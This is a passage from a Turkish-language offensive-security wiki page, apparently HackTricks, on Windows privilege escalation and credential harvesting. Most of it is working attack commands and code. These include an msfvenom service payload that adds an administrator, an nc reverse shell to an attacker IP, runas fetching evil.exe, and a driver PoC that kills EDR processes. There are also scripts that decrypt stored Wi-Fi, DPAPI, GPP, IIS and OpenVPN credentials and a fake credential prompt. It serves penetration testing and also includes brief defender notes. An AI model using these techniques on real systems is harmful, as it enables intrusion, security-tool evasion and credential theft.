appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Bir yürütülebilir dosyanın yolu tırnak içinde değilse, Windows boşluktan önceki her son parçayı çalıştırmaya çalışır.

Örneğin, _C:\Program Files\Some Folder\Service.exe_ yolu için Windows şunları çalıştırmayı dener:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Yerleşik Windows hizmetlerine ait olanlar hariç, tüm alıntılanmamış (unquoted) hizmet yollarını listeleyin:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Bu zafiyeti tespit edip sömürebilirsiniz** metasploit ile: `exploit/windows/local/trusted\_service\_path`  
Metasploit ile elle bir service binary oluşturabilirsiniz:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Kurtarma İşlemleri

Windows, bir servis başarısız olursa alınacak işlemleri belirtmeye izin verir. Bu özellik bir binary'ye işaret edecek şekilde yapılandırılabilir. Eğer bu binary değiştirilebilirse, privilege escalation mümkün olabilir. Daha fazla ayrıntı için [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Uygulamalar

### Yüklü Uygulamalar

Kontrol et **permissions of the binaries** (belki birini overwrite edip privilege escalation sağlayabilirsin) ve **folders** izinlerini ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Yazma İzinleri

Bazı özel dosyaları okumak için bir config dosyasını değiştirebilir misiniz ya da Administrator hesabı tarafından çalıştırılacak bir binary'i (schedtasks) değiştirebilir misiniz kontrol edin.

Sistemde zayıf klasör/dosya izinlerini bulmanın bir yolu şudur:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ `plugins` alt klasörlerindeki herhangi bir plugin DLL'ini otomatik olarak yükler. Yazılabilir bir portable/kopya kurulum mevcutsa, kötü amaçlı bir plugin bırakmak her başlatmada `notepad++.exe` içinde otomatik kod çalıştırmaya yol açar (bu, `DllMain` ve plugin callback'lerinden de olabilir).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Run at startup

**Farklı bir kullanıcı tarafından çalıştırılacak bir registry veya binary dosyasını üzerine yazıp yazamayacağınızı kontrol edin.**\
**Aşağıdaki sayfayı okuyun** ilginç **autoruns konumlarıyla yetki yükseltme** hakkında daha fazla bilgi edinmek için:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Olası **third party weird/vulnerable** sürücüleri arayın
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
If a driver exposes an arbitrary kernel read/write primitive (common in poorly designed IOCTL handlers), you can escalate by stealing a SYSTEM token directly from kernel memory. See the step‑by‑step technique here:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

For race-condition bugs where the vulnerable call opens an attacker-controlled Object Manager path, deliberately slowing the lookup (using max-length components or deep directory chains) can stretch the window from microseconds to tens of microseconds:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive bellek bozulması primitifleri

Modern hive vulnerabilities let you groom deterministic layouts, abuse writable HKLM/HKU descendants, and convert metadata corruption into kernel paged-pool overflows without a custom driver. Learn the full chain here:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Device object'larda FILE_DEVICE_SECURE_OPEN eksikliğinin kötüye kullanılması (LPE + EDR kill)

Some signed third‑party drivers create their device object with a strong SDDL via IoCreateDeviceSecure but forget to set FILE_DEVICE_SECURE_OPEN in DeviceCharacteristics. Without this flag, the secure DACL is not enforced when the device is opened through a path containing an extra component, letting any unprivileged user obtain a handle by using a namespace path like:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

Once a user can open the device, privileged IOCTLs exposed by the driver can be abused for LPE and tampering. Example capabilities observed in the wild:
- Return full-access handles to arbitrary processes (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks).
- Terminate arbitrary processes, including Protected Process/Light (PP/PPL), allowing AV/EDR kill from user land via kernel.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Geliştiriciler için önlemler
- DACL tarafından kısıtlanması amaçlanan aygıt nesneleri oluşturulurken her zaman FILE_DEVICE_SECURE_OPEN ayarlayın.
- Ayrıcalıklı işlemler için çağıran bağlamını doğrulayın. İşlem sonlandırılmasına veya handle iadesine izin vermeden önce PP/PPL kontrolleri ekleyin.
- IOCTLs'leri sınırlandırın (access masks, METHOD_*, input validation) ve doğrudan kernel ayrıcalıkları yerine brokered modelleri değerlendirin.

Savunucular için tespit önerileri
- Şüpheli aygıt adlarına (ör., \\ .\\amsdk*) yapılan user-mode open'ları ve kötüye kullanımı işaret eden belirli IOCTL dizilerini izleyin.
- Microsoft’s vulnerable driver blocklist'i (HVCI/WDAC/Smart App Control) uygulayın ve kendi izin/verme listelerinizi muhafaza edin.


## PATH DLL Hijacking

Eğer **PATH üzerinde bulunan bir klasör içinde yazma izniniz** varsa, bir process tarafından yüklenen bir DLL'i hijack ederek **ayrıcalıkları yükseltebilirsiniz**.

PATH içindeki tüm klasörlerin izinlerini kontrol edin:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Bu kontrolün nasıl suistimal edileceği hakkında daha fazla bilgi için:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Ağ

### Paylaşımlar
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts file'te hardcoded olan diğer bilinen bilgisayarları kontrol edin
```
type C:\Windows\System32\drivers\etc\hosts
```
### Ağ Arayüzleri ve DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Açık Portlar

Dışarıdan **kısıtlı servisleri** kontrol edin
```bash
netstat -ano #Opened ports?
```
### Yönlendirme Tablosu
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP Tablosu
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Güvenlik Duvarı Kuralları

[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(kuralları listele, kural oluştur, kapat...)**

Daha fazla[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe` ayrıca `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` içinde bulunabilir

If you get root user you can listen on any port (bir portu dinlemek için `nc.exe`'yi ilk kullandığınızda, GUI üzerinden `nc`'nin güvenlik duvarı tarafından izin verilip verilmeyeceğini soracaktır).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
bash'i root olarak kolayca başlatmak için `--default-user root` deneyebilirsiniz.

`WSL` dosya sistemini şu klasörde keşfedebilirsiniz: `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Windows Kimlik Bilgileri

### Winlogon Kimlik Bilgileri
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Kimlik Bilgileri Yöneticisi / Windows Vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\  
Windows Vault, sunucular, web siteleri ve diğer programlar için Windows'in **kullanıcıları otomatik olarak oturum açtırabileceği** kullanıcı kimlik bilgilerini depolar. İlk bakışta, kullanıcıların Facebook, Twitter, Gmail vb. kimlik bilgilerini tarayıcılar aracılığıyla otomatik oturum açma amacıyla saklayabildikleri düşünülebilir. Ancak durum öyle değildir.

Windows Vault, Windows'in kullanıcıları otomatik olarak oturum açtırabileceği kimlik bilgilerini depolar; bu, herhangi bir **Windows uygulamasının bir kaynağa erişmek için kimlik bilgilerine ihtiyaç duyması** (sunucu veya web sitesi) durumunda **Credential Manager** ve Windows Vault'u kullanabileceği ve kullanıcıların her seferinde kullanıcı adı ve parola girmesi yerine sağlanan kimlik bilgilerini kullanabileceği anlamına gelir.

Uygulamalar Credential Manager ile etkileşime girmezlerse, belirli bir kaynak için kimlik bilgilerini kullanmalarının mümkün olduğunu sanmıyorum. Bu nedenle, uygulamanız vault'tan yararlanmak istiyorsa, varsayılan depolama vault'undan o kaynak için kimlik bilgilerini talep etmek üzere bir şekilde **credential manager ile iletişim kurmalıdır**.

Makinede depolanan kimlik bilgilerini listelemek için `cmdkey` kullanın.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Daha sonra kaydedilmiş kimlik bilgilerini kullanmak için `runas`'ı `/savecred` seçeneğiyle kullanabilirsiniz. Aşağıdaki örnek bir SMB paylaşımı üzerinden uzak bir binary çağırıyor.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Sağlanan kimlik bilgileriyle `runas` kullanmak.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Unutmayın ki mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), veya [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) kullanılabilir.

### DPAPI

The **Data Protection API (DPAPI)** provides a method for symmetric encryption of data, predominantly used within the Windows operating system for the symmetric encryption of asymmetric private keys. This encryption leverages a user or system secret to significantly contribute to entropy.

**DPAPI enables the encryption of keys through a symmetric key that is derived from the user's login secrets**. In scenarios involving system encryption, it utilizes the system's domain authentication secrets.

DPAPI kullanılarak şifrelenmiş kullanıcı RSA anahtarları %APPDATA%\Microsoft\Protect\{SID} dizininde saklanır; burada {SID} kullanıcının [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier)'sini temsil eder. **The DPAPI key, co-located with the master key that safeguards the user's private keys in the same file**, tipik olarak 64 bayt rastgele veriden oluşur. (Bu dizine erişimin kısıtlı olduğunu, içeriklerinin CMD'de `dir` komutuyla listelenmesinin engellendiğini ancak PowerShell ile listelenebileceğini not etmek önemlidir).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Bu dosyanın şifresini çözmek için uygun argümanlarla (`/pvk` veya `/rpc`) **mimikatz module** `dpapi::masterkey`'i kullanabilirsiniz.

**ana parola tarafından korunan credentials dosyaları** genellikle şu dizinlerde bulunur:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Uygun `/masterkey` ile **mimikatz module** `dpapi::cred` kullanarak şifre çözebilirsiniz.  
`sekurlsa::dpapi` module ile **bellekten** birçok DPAPI **masterkey** çıkarabilirsiniz (eğer root iseniz).

{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Kimlik Bilgileri

**PowerShell credentials** genellikle betik yazma ve otomasyon görevlerinde şifrelenmiş kimlik bilgilerini kolayca saklamak için kullanılır. Bu kimlik bilgileri **DPAPI** ile korunur; bu da genellikle oluşturuldukları aynı kullanıcı ve aynı bilgisayarda çözülebilecekleri anlamına gelir.

Bir PS credential'ını içeren dosyadan **şifresini çözmek** için şunu yapabilirsiniz:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Kablosuz Ağ
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Kaydedilmiş RDP Bağlantıları

Bunları şu konumlarda bulabilirsiniz: `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\ 
ve `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Son Çalıştırılan Komutlar
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Uzak Masaüstü Kimlik Bilgileri Yöneticisi**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Uygun `/masterkey` ile **Mimikatz** `dpapi::rdg` modülünü kullanarak herhangi bir .rdg dosyasının **şifresini çözün**\  
Mimikatz `sekurlsa::dpapi` modülü ile bellekten birçok DPAPI masterkey'i **çıkarabilirsiniz**

### Sticky Notes

Kullanıcılar genellikle Windows iş istasyonlarında StickyNotes uygulamasını parolaları **kaydetmek** ve diğer bilgileri için kullanır; bunun bir veritabanı dosyası olduğunu fark etmezler. Bu dosya `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` konumunda yer alır ve her zaman aranmaya ve incelenmeye değerdir.

### AppCmd.exe

**AppCmd.exe'den parolaları kurtarmak için Yönetici olmanız ve High Integrity düzeyinde çalıştırmanız gerektiğini unutmayın.**\  
**AppCmd.exe** `%systemroot%\system32\inetsrv\` dizininde bulunur.\  
Bu dosya mevcutsa bazı **credentials** yapılandırılmış olabilir ve **kurtarılabilir**.

Bu kod [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) kaynağından çıkarılmıştır:
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` dosyasının varlığını kontrol et.\  
Yükleyiciler **SYSTEM privileges ile çalıştırılır**, birçoğu **DLL Sideloading (Bilgi için** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Dosyalar ve Registry (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Anahtarları
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys in registry

SSH private keys, registry key `HKCU\Software\OpenSSH\Agent\Keys` içinde saklanabilir; bu yüzden orada ilginç bir şey olup olmadığını kontrol etmelisiniz:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Eğer o dizinde herhangi bir kayıt bulursanız, muhtemelen kaydedilmiş bir SSH anahtarıdır. Şifrelenmiş olarak saklanır ancak [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) kullanılarak kolayca çözülebilir.\
Bu teknik hakkında daha fazla bilgi için: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Eğer `ssh-agent` servisi çalışmıyorsa ve sistem açılışında otomatik başlamasını istiyorsanız çalıştırın:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Bu tekniğin artık geçerli görünmediği anlaşılıyor. Birkaç ssh anahtarı oluşturmaya, bunları `ssh-add` ile eklemeye ve bir makineye ssh ile bağlanmaya çalıştım. Kayıt defteri HKCU\Software\OpenSSH\Agent\Keys mevcut değil ve procmon asimetrik anahtar kimlik doğrulaması sırasında `dpapi.dll` kullanımını tespit etmedi.

### Gözetimsiz dosyalar
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Bu dosyaları ayrıca **metasploit** kullanarak arayabilirsiniz: _post/windows/gather/enum_unattend_
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM yedekleri
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Bulut Kimlik Bilgileri
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Adı **SiteList.xml** olan bir dosya ara

### Cached GPP Pasword

Önceden, Group Policy Preferences (GPP) aracılığıyla bir grup makinede özel yerel yönetici hesaplarının dağıtılmasına izin veren bir özellik mevcuttu. Ancak bu yöntem önemli güvenlik açıklarına sahipti. Birincisi, SYSVOL içinde XML dosyaları olarak saklanan Group Policy Objects (GPOs) herhangi bir domain kullanıcısı tarafından erişilebiliyordu. İkincisi, bu GPP'lerdeki parolalar, kamuya belgelenmiş varsayılan bir anahtar kullanılarak AES256 ile şifrelenmiş olmalarına rağmen, herhangi bir kimlikli kullanıcı tarafından çözülebiliyordu. Bu ciddi bir risk teşkil ediyordu, çünkü kullanıcıların yükseltilmiş ayrıcalıklar elde etmelerine yol açabilirdi.

Bu riski azaltmak için, "cpassword" alanı boş olmayan yerel önbelleğe alınmış GPP dosyalarını tarayan bir fonksiyon geliştirildi. Böyle bir dosya bulunduğunda, fonksiyon parolayı çözer ve özel bir PowerShell nesnesi döndürür. Bu nesne GPP hakkında ve dosyanın konumu hakkında ayrıntılar içerir; bu da bu güvenlik açığının tespiti ve giderilmesine yardımcı olur.

Search in `C:\ProgramData\Microsoft\Group Policy\history` or in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista öncesi)_ for these files:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**To decrypt the cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Parolaları almak için crackmapexec kullanmak:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Konfigürasyonu
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Kimlik bilgileri içeren web.config örneği:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN giriş bilgileri
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Günlükler
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Credentials isteyin

Eğer kullanıcının bunları biliyor olabileceğini düşünüyorsanız, her zaman **kullanıcının kendi credentials'ını veya farklı bir kullanıcının credentials'ını girmesini isteyebilirsiniz** (istemciye doğrudan **credentials** **sormanın** gerçekten **riskli** olduğunu unutmayın):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Olası credentials içeren dosya adları**

Bir süre önce **passwords**'ı **clear-text** veya **Base64** olarak içeren bilinen dosyalar
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
